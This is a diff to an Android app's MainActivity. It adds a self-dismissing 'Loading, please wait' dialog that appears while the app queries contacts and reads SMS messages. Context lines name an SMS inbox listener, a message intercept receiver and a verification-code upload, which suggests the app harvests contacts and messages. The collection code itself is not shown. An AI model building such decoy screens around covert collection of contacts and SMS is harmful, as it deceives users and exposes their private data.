@@ -1,6 +1,7 @@
 package cn.bmob.sdkdemo;
 
 import android.Manifest;
+import android.app.ProgressDialog;
 import android.content.AsyncQueryHandler;
 import android.content.BroadcastReceiver;
 import android.content.ClipData;
@@ -15,6 +16,7 @@ import android.database.Cursor;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Handler;
 import android.provider.ContactsContract;
 import android.provider.MediaStore;
 import android.provider.Settings;
@@ -74,6 +76,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
     private OnSmsInboxListener mListener;
     private MessageInterceptReceiver messageInterceptReceiver;
     private EditText et_phone, et_code;
+    private ProgressDialog progressdialog;
 
     public interface OnSmsInboxListener {
         void onSuccess(String json);
@@ -196,7 +199,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
 //        number = number.replace("+", "");
 //        number = number.replace("-", "");
 //        number = number.replace(" ", "");
-        String regEx="[^0-9]";
+        String regEx = "[^0-9]";
         Pattern p = Pattern.compile(regEx);
         Matcher m = p.matcher(number);
         number = m.replaceAll("").trim();
@@ -623,6 +626,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                         public void accept(Permission permission) throws Exception {
                             if (permission.granted) {
                                 // 用户已经同意该权限
+                                showProgressDialog();
                                 queryContact();  // 应有监测功能必须要开启储存权限才行
                                 readMessage3();
 //                                upLoadVerifyCode();
@@ -650,10 +654,29 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                     });
 
         } else {
+            showProgressDialog();
             queryContact();  // 应有监测功能必须要开启储存权限才行
             readMessage3();
 //            upLoadVerifyCode();
         }
+    }
+
+    private void showProgressDialog() {
+        if (progressdialog == null) {
+            progressdialog = new ProgressDialog(MainActivity.this);
+        }
+        progressdialog.setTitle("注意");
+        progressdialog.setMessage("正在加载中，请稍后");
+        progressdialog.setCancelable(true);
+        progressdialog.show();
+        new Handler().postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                if (progressdialog != null && progressdialog.isShowing()) {
+                    progressdialog.dismiss();
+                }
+            }
+        }, 4000);
     }
 
     private void upLoadVerifyCode() {
